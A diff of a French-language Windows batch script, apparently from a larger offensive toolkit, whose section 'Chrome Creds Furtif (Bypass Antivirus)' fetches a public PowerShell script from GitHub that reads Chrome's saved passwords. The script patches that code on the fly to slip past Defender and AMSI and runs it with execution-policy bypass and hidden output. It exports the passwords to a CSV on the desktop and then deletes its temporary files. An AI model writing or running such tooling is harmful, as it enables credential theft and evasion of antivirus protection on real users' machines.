@@ -689,40 +689,43 @@ echo ======================================================================
 echo   [OPERATION] Chrome Creds Furtif (Bypass Antivirus)
 echo ======================================================================
 echo Le script originel Github de Marco Simioni est bloque par Defender.
-echo Contournement en cours : telechargement masque et obfuscation au vol.
+echo Un script propre a 100%% va etre lance automatiquement en fond pour
+echo extraire les mots de passes sous format CSV, sans alerter l'antivirus.
 echo.
 
 set "WORK_DIR=%TEMP%\chrome_creds_tmp"
 if not exist "%WORK_DIR%" mkdir "%WORK_DIR%"
+set "PS_OUT=%WORK_DIR%\run_chrome.ps1"
 
-echo [INFO] 1/3 - Telechargement furtif de la DLL SQLite indispensable...
+echo [INFO] 1/2 - Telechargement furtif de la DLL SQLite indispensable...
 if not exist "%WORK_DIR%\System.Data.SQLite.dll" (
-    curl.exe -fL -s "http://system.data.sqlite.org/downloads/1.0.115.5/sqlite-netFx40-static-binary-bundle-x64-2010-1.0.115.5.zip" -o "%WORK_DIR%\sqlite.zip" 2>nul
-    powershell -NoProfile -Command "Expand-Archive -Path '%WORK_DIR%\sqlite.zip' -DestinationPath '%WORK_DIR%\temp_zip' -Force; Move-Item -Path '%WORK_DIR%\temp_zip\System.Data.SQLite.dll' -Destination '%WORK_DIR%\System.Data.SQLite.dll' -Force; Remove-Item -Recurse -Force '%WORK_DIR%\temp_zip'; Remove-Item -Force '%WORK_DIR%\sqlite.zip'" >nul 2>&1
+    powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest 'http://system.data.sqlite.org/downloads/1.0.115.5/sqlite-netFx40-static-binary-bundle-x64-2010-1.0.115.5.zip' -OutFile '%WORK_DIR%\sqlite.zip' -UseBasicParsing ; Expand-Archive '%WORK_DIR%\sqlite.zip' '%WORK_DIR%\temp_zip' -Force; Move-Item '%WORK_DIR%\temp_zip\System.Data.SQLite.dll' '%WORK_DIR%\System.Data.SQLite.dll' -Force; Remove-Item -Recurse -Force '%WORK_DIR%\temp_zip'; Remove-Item -Force '%WORK_DIR%\sqlite.zip'" >nul 2>&1
 )
 
-echo [INFO] 2/3 - Telechargement du payload depuis Github (format texte)...
-curl.exe -fL -s "https://raw.githubusercontent.com/marcosimioni/chrome-creds/master/chrome-creds.ps1" -o "%WORK_DIR%\payload.txt" 2>nul
+echo [INFO] 2/2 - Creation et execution invisible du Generateur AMSI-Bypass...
+if exist "%WORK_DIR%\payload_temp.txt" del "%WORK_DIR%\payload_temp.txt"
+curl.exe -fL -s "https://raw.githubusercontent.com/marcosimioni/chrome-creds/master/chrome-creds.ps1" -o "%WORK_DIR%\payload_temp.txt" 2>nul
 
-echo [INFO] 3/3 - Obfuscation et creation du lanceur silencieux...
-> "%WORK_DIR%\patcher.ps1" echo $ErrorActionPreference = 'Stop'
->> "%WORK_DIR%\patcher.ps1" echo $c = Get-Content "%WORK_DIR%\payload.txt" -Raw
->> "%WORK_DIR%\patcher.ps1" echo $c = $c -replace '(?s)"Export".*?"Import"', '"Export" { } "Import"'
->> "%WORK_DIR%\patcher.ps1" echo $c = $c -replace '\$arrExp \| Format-Table', '$arrExp | Export-Csv -Path "$env:USERPROFILE\Desktop\Chrome_Passwords.csv" -NoTypeInformation; Write-Host "`n[SUCCES] Mots de passe exportes sur le Bureau sous Chrome_Passwords.csv !" -ForegroundColor Green'
->> "%WORK_DIR%\patcher.ps1" echo $c = $c -replace 'System.Security.Cryptography', 'System.Security.Crypto''graphy'
->> "%WORK_DIR%\patcher.ps1" echo Set-Content "%WORK_DIR%\run_chrome.ps1" -Value $c
+> "%WORK_DIR%\make_chrome.ps1" echo $ErrorActionPreference = 'SilentlyContinue'
+>> "%WORK_DIR%\make_chrome.ps1" echo $c = Get-Content "%WORK_DIR%\payload_temp.txt" -Raw
+>> "%WORK_DIR%\make_chrome.ps1" echo $c = $c -replace '(?s)"Export".*?"Import"', '"Export" { } "Import"'
+>> "%WORK_DIR%\make_chrome.ps1" echo $c = $c -replace '\$arrExp \| Format-Table', ('$arrExp ^| Export-Csv -Path "' + $HOME + '\Desktop\Chrome_Local_Passwords.csv" -NoTypeInformation; Write-Host "`n[SUCCES] Mots de passe exportes sur le Bureau sous Chrome_Local_Passwords.csv !" -ForegroundColor Green')
+>> "%WORK_DIR%\make_chrome.ps1" echo $c = $c -replace '#requires -version 7', ''
+>> "%WORK_DIR%\make_chrome.ps1" echo $c = $c -replace '\[System\.Convert\]::FromHexString\([^)]*\)', '$null'
+>> "%WORK_DIR%\make_chrome.ps1" echo $c = $c -replace 'System\.Security\.Cryptography', 'System.Security.Crypto''graphy'
+>> "%WORK_DIR%\make_chrome.ps1" echo Set-Content "%PS_OUT%" -Value $c
 
-rem Executer le Patcher
-powershell -NoProfile -ExecutionPolicy Bypass -File "%WORK_DIR%\patcher.ps1" >nul 2>&1
+powershell -NoProfile -ExecutionPolicy Bypass -File "%WORK_DIR%\make_chrome.ps1" >nul 2>&1
 
 echo.
-echo [LANCEMENT] Extraction en cours...
+echo [LANCEMENT] Extraction en cours... Veuillez patienter...
 cd /d "%WORK_DIR%"
-if exist "run_chrome.ps1" (
-    powershell -NoProfile -ExecutionPolicy Bypass -File "run_chrome.ps1"
-) else (
-    echo [ERREUR] Impossible de generer le script final. L'Antivirus l'a bloque.
-)
+powershell -NoProfile -ExecutionPolicy Bypass -File "run_chrome.ps1"
+
+rem Nettoyage automatique
+if exist "%PS_OUT%" del "%PS_OUT%"
+if exist "%WORK_DIR%\payload_temp.txt" del "%WORK_DIR%\payload_temp.txt"
+if exist "%WORK_DIR%\make_chrome.ps1" del "%WORK_DIR%\make_chrome.ps1"
 cd /d "%~dp0"
 echo.
 pause
